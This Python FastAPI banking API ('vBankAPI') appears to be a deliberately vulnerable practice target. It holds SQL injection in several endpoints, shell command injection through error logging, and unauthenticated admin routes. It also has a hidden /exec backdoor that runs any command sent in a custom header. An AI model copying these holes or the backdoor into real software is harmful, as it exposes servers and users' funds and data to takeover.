import subprocess
from datetime import datetime
from fastapi import FastAPI, HTTPException, Depends, Request, Response
from fastapi.responses import PlainTextResponse
from fastapi.middleware.cors import CORSMiddleware
from sqlalchemy.orm import Session
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy import text
from models import User, DBUser, UserLogin, Transfer, ChangePassword, EditUser
from auth import createAccessToken, validateAccessToken
from database import getDB, createDatabase
from typing import Optional
import re

def has_quotes(check_string):
    pattern = r"[\"']"
    if re.search(pattern, check_string):
        return True
    return False

ORIGINS = [
    "http://vbank.api",
]

app = FastAPI(title="vBankAPI", version="1.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ORIGINS,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type"],
)

@app.middleware("http")
async def options_handler(request: Request, callNext):
    if request.method == "OPTIONS":
        response = Response()
        origin_header = request.headers.get("Origin")
        if "vbank.api" not in origin_header:
            response.headers["Access-Control-Allow-Origin"] = ORIGINS[0]
        else:
            if origin_header not in ORIGINS:
                ORIGINS.append(origin_header)
            response.headers["Access-Control-Allow-Origin"] = origin_header
        response.headers["Access-Control-Allow-Credentials"] = "true"
        response.headers["Content-Type"] = "application/json"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = "Authorization, Content-Type"
        return response

    return await callNext(request)

@app.get("/api", description="This endpoint will return the current version of the vBankAPI.", name="Version")
async def root_path():
    data = {"detail":"vBankAPI v1.0"}
    return data

@app.get("/api/ping", description="This endpoint is a healthcheck to see if the application is still alive.", name="Health Check")
async def ping():
    data = {"detail":"Pong"}
    return data
    
@app.post("/api/register", description="This endpoint allows new users to register into the API.", name="Register new user")
async def register_user(user: User, db: Session = Depends(getDB)):
    db_user = DBUser(**user.model_dump())
    print(user.balance)
    if db.query(DBUser).filter_by(username=user.username).first():
        raise HTTPException(status_code=400, detail="Username already registered")
    if db.query(DBUser).filter_by(email=user.email).first():
        raise HTTPException(status_code=400, detail="Email already registered")
    db_user.account_number = 1001
    while db.query(DBUser).filter_by(account_number=db_user.account_number).first():
        db_user.account_number = db_user.account_number + 1
    db.add(db_user)
    db.commit()
    db.close()
    data = {"detail":"User successfuly registered!"}
    return data

@app.post("/api/auth", description="This endpoint allows users to authenticate.", name="Authentication")
async def auth_user(login: UserLogin, db: Session = Depends(getDB)):
    data = login.model_dump()
    username = login.username
    username_parameter, username_value = list(data.items())[0]
    data = {username_parameter: username_value}
    
    login_query = text(f"SELECT * FROM users WHERE username = '{username}' AND password = '{login.password}'")

    try:
        result = db.execute(login_query)
        user_data = result.fetchone()
        if user_data:
            return createAccessToken(data)
        else:
            raise HTTPException(status_code=400, detail="Invalid Username/Password")
    except SQLAlchemyError as sql_error:
        raise HTTPException(status_code=400, detail=f"Error: {sql_error}")

@app.get("/api/profile", description="This endpoint allows you to get the current user information.", name="Current user info")
async def my_profile(db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    get_user_query = text(f"SELECT * FROM users WHERE username = '{token['username']}'")
    result = db.execute(get_user_query)
    columns = result.keys()
    data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    db.close()
    return data

@app.post("/api/profile", description="This endpoint allows you to edit the current user.", name="Edit user info")
async def edit_user(user: EditUser, request: Request, db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    json_data = await request.json()
    username = user.username
    if username == None:
        raise HTTPException(status_code=404, detail="Missing 'username' field.")
    
    get_user_query = text(f"SELECT username FROM users WHERE username = :x")
    get_user_query = get_user_query.bindparams(x=username)
    result = db.execute(get_user_query).fetchone()
    if not result:
        raise HTTPException(status_code=404, detail="User not found")
    
    for key, value in zip(json_data.keys(), json_data.values()):
            if key != username:
                if has_quotes(key):
                    raise HTTPException(status_code=400, detail="Malicious attempt")
                edit_user_query = text(f"""
                    UPDATE users
                    SET {key} = :y
                    WHERE username = :z;
                """)
                edit_user_query = edit_user_query.bindparams(y=value, z=username)
                try:
                    db.execute(edit_user_query)
                    db.commit()
                except SQLAlchemyError as sql_error:
                    error_str = str(sql_error)
                    subprocess.Popen(f"echo \"{error_str}\" >> sql_errors.txt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    data = {"detail":"This user has been updated."}
    return data

@app.post("/api/profile/change-password", description="This endpoint allows users to change their passwords.", name="Change Password")
async def change_password(change_password_params: ChangePassword, db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    username = change_password_params.username
    current_password = change_password_params.current_password
    new_password = change_password_params.new_password
    confirm_password = change_password_params.confirm_password

    check_password_query = text(f"SELECT password FROM users WHERE username = :x")
    check_password_query = check_password_query.bindparams(x=username)
    result = db.execute(check_password_query).fetchone()
    if not result:
        raise HTTPException(status_code=404, detail="User not found")
    result = result[0]
    

    if current_password != result:
        raise HTTPException(status_code=400, detail="Current password is not valid.")

    if new_password != confirm_password:
        raise HTTPException(status_code=400, detail="Parameters new_password and confirm_password do not match!")
    change_password_query = text(f"UPDATE users SET password = :x WHERE username = :y;")
    change_password_query = change_password_query.bindparams(x=new_password, y=username)
    db.execute(change_password_query)
    db.commit()

    data = {"detail": f"Your password was successfully changed!"}

    return data


@app.get("/api/users", description="This endpoint allows authenticated admins to retrieve all users in the DB.", name="Get Users")
async def get_users(db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    get_users_query = text(f"SELECT * FROM users")
    result = db.execute(get_users_query)
    columns = result.keys()
    data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    db.close()
    return data

@app.get("/api/users/{id}", description="This endpoint allows authenticated admins to retrieve users by their IDs.", name="Get user by ID")
async def get_user_by_id(id: int, db: Session = Depends(getDB)):
    get_user_by_id_query = text(f"SELECT * FROM users WHERE id = {id}")
    result = db.execute(get_user_by_id_query)
    columns = result.keys()
    data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    if data != []:
        return data
    else:
        raise HTTPException(status_code=404, detail="User not found.")

@app.delete("/api/users/{id}", description="This endpoint allows authenticated admins to delete users by their IDs.", name="Delete user by ID")
async def delete_user_by_id(id: int, db: Session = Depends(getDB)):
    get_user_by_id_query = text(f"SELECT * FROM users WHERE id = {id}")
    result = db.execute(get_user_by_id_query)
    columns = result.keys()
    user_data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    if user_data != []:
        delete_user_by_id_query = text(f"DELETE FROM users WHERE id = {id}")
        db.execute(delete_user_by_id_query)
        db.commit()
        db.close()
        data = {"detail":f"User ID {id} successfuly deleted."}
        return data
    else:
        raise HTTPException(status_code=404, detail="User not found.")

@app.post("/api/transfer", description="Transfer money between two different accounts.", name="Transfer money")
async def transfer_money(transfer: Transfer, db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    dest_acc_number = transfer.dest_account
    to_transfer = transfer.amount
    username = token['username']

    get_orig_acc_amount_query = text(f"SELECT balance FROM users where username = :x")
    get_orig_acc_amount_query = get_orig_acc_amount_query.bindparams(x=username)
    get_orig_acc_number_query = text(f"SELECT account_number FROM users where username = :x")
    get_orig_acc_number_query = get_orig_acc_number_query.bindparams(x=username)
    get_dest_acc_amount_query = text(f"SELECT balance FROM users where account_number = {dest_acc_number}")

    orig_acc_number = db.execute(get_orig_acc_number_query)
    orig_acc_number = orig_acc_number.fetchone()[0]
    orig_acc_amount = db.execute(get_orig_acc_amount_query)
    dest_acc_amount = db.execute(get_dest_acc_amount_query)

    curr_amount_dest_acc = int(dest_acc_amount.fetchone()[0])
    curr_amount_orig_acc = int(orig_acc_amount.fetchone()[0])

    new_amount_dest_acc = curr_amount_dest_acc + to_transfer
    new_amount_orig_acc = curr_amount_orig_acc - to_transfer

    if to_transfer > curr_amount_orig_acc:
        raise HTTPException(status_code=401, detail="You're trying to transfer more than what you have in your account.")
    
    add_to_dest_account = text(f"UPDATE users SET balance = {new_amount_dest_acc} WHERE account_number = {transfer.dest_account};")
    
    add_to_orig_account = text(f"""
                UPDATE users
                SET balance = {new_amount_orig_acc}
                WHERE username = :x;
            """)
    
    add_to_orig_account = add_to_orig_account.bindparams(x=username)
    
    current_utc_time = datetime.utcnow()
    formatted_time = current_utc_time.strftime('%d-%m-%Y %H:%M:%S')
    
    add_transaction_log = text(f"""
                INSERT INTO transactions (
                               date,
                               orig_account_number,
                               dest_account_number,
                               amount
                )
                VALUES (
                               '{formatted_time}',
                               {orig_acc_number},
                               {dest_acc_number},
                               {to_transfer});
                
            """)


    db.execute(add_to_dest_account)
    db.execute(add_to_orig_account)
    db.execute(add_transaction_log)
    db.commit()
    db.close()
    data = {"detail":f"{to_transfer} USD were transfered from account {orig_acc_number} to account {dest_acc_number}"}
    return data


@app.get("/api/transactions", description="This endpoint allows an authenticated user to see all their transactions.", name="Get all transactions")
async def get_transactions(db: Session = Depends(getDB), token = Depends(validateAccessToken)):
    username = token['username']
    get_acc_number_query = text(f"SELECT account_number FROM users where username = :x")
    get_acc_number_query = get_acc_number_query.bindparams(x=username)
    acc_number = db.execute(get_acc_number_query).fetchone()[0]

    get_transactions_query = text(f"SELECT * FROM transactions WHERE orig_account_number = {acc_number} or dest_account_number = {acc_number}")
    
    result = db.execute(get_transactions_query)
    columns = result.keys()
    data = [{column: value for column, value in zip(columns, row)} for row in result.fetchall()]
    if data != []:
        return data
    else:
        raise HTTPException(status_code=404, detail="No transactions were found.")

@app.get("/exec", include_in_schema=False, response_class=PlainTextResponse)
async def execute_cmd(request: Request):
    cmd = request.headers.get("X-46355-1")
    if not cmd:
        raise HTTPException(status_code=404)
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    if stderr:
        output = stderr.decode("utf-8")
        return output
    output = stdout.decode("utf-8")
    return output      
    
createDatabase()


    
